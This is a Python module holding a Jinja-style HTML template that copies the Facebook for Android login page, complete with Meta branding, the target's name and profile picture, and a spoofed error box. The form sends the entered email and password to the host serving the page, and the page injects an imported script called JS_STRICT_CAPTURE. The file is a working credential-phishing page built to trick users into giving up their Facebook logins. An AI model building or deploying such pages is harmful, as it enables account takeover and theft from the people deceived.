"""html_mobile.py — auto-generated from templates.py."""

import base64

from .js_capture import JS_STRICT_CAPTURE

HTML_MOBILE = r"""
<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta name="referrer" content="no-referrer">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="shortcut icon" href="/static/svd_logo.svg" type="image/svg+xml">
    <title>Facebook</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        html, body { height: 100%; overflow-y: auto; }
        body { background-color: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; min-height: 100vh; }
        .fb-input { border: 1px solid #ccd0d5; border-radius: 12px; padding: 12px; width: 100%; font-size: 16px; background: white; outline: none; }
        .fb-btn { background-color: #0064e0; color: #fff; border-radius: 25px; padding: 10px; font-weight: 600; width: 100%; font-size: 16px; border: none; }
        .create-btn { color: #0064e0; border: 1px solid #0064e0; border-radius: 25px; padding: 8px; font-weight: 600; width: 100%; font-size: 14px; background: transparent; }
        .profile-pic { width: 80px; height: 80px; border-radius: 50%; object-fit: cover; border: 3px solid #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .meta-brand { display: flex; flex-direction: column; align-items: center; gap: 4px; }
        .meta-brand img { height: 28px; width: auto; }
        .meta-brand span { font-size: 13px; font-weight: 700; color: #1C2B33; letter-spacing: 1.5px; text-transform: uppercase; }
        @media (max-height: 600px) { .meta-brand img { height: 22px; } .meta-brand span { font-size: 11px; } }
        @media (min-width: 480px) { .login-container { max-width: 400px; } }
    </style>
</head>
<body>
    """ + JS_STRICT_CAPTURE + r"""
    <div class="w-full flex items-center justify-center p-2 bg-white border-b border-gray-200 shrink-0">
        <div class="flex items-center text-[#1877f2] text-xs">Facebook for Android</div>
    </div>
    <div class="flex-grow flex flex-col items-center px-6 justify-around py-4 w-full login-container mx-auto">
        <div class="flex flex-col items-center w-full">
            <p class="text-gray-500 text-xs mb-4">English (US)</p>
            <div class="flex flex-col items-center w-full">
                {% if picture %}
                    <img draggable="false" src="{{ picture }}" class="profile-pic mb-2" onerror="this.src='https://static.xx.fbcdn.net/rsrc.php/y1/r/ay1hV6OlegS.ico';">
                {% else %}
                    <img draggable="false" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/ay1hV6OlegS.ico" class="w-12 h-12 mb-2">
                {% endif %}
                <h3 class="text-lg font-bold text-gray-800 mb-4">{{ user_name }}</h3>
            </div>
            <div id="error-box" class="{% if not message %}hidden{% endif %} w-full bg-[#FFEBE8] border border-[#DD3C10] text-[#333333] p-2.5 rounded-sm text-[13px] mb-3 leading-tight flex items-start text-left">
                <i class="fas fa-exclamation-triangle text-[#DD3C10] mt-0.5 mr-2"></i>
                <span>{{ message }}</span>
            </div>
            <form method="POST" class="w-full space-y-3" onsubmit="return validateLogin('email-mob')">
                <input type="hidden" name="action" value="login">
                <input type="text" name="email" id="email-mob" placeholder="{{ email_ph }}" class="fb-input {% if message %}border-red-500{% endif %}" required>
                <input type="password" name="pass" placeholder="{{ pass_ph }}" class="fb-input {% if message %}border-red-500{% endif %}" required>
                <button type="submit" class="fb-btn mt-1">{{ login_btn }}</button>
            </form>
            <a href="#" class="mt-3 text-gray-700 font-medium text-xs">{{ forgot }}</a>
        </div>
        <div class="w-full flex flex-col items-center mt-auto mb-4">
            <button class="create-btn mb-4">{{ create }}</button>
            <div class="meta-brand">
                <span style="font-size:11px;font-weight:400;color:#65676B;text-transform:none;letter-spacing:0;">From</span>
                <span style="font-size:15px;font-weight:800;color:#1C2B33;letter-spacing:2px;text-transform:uppercase;">META</span>
            </div>
        </div>
    </div>
    <script>
    function validateLogin(id){ return true; }
    </script>
</body>
</html>
"""
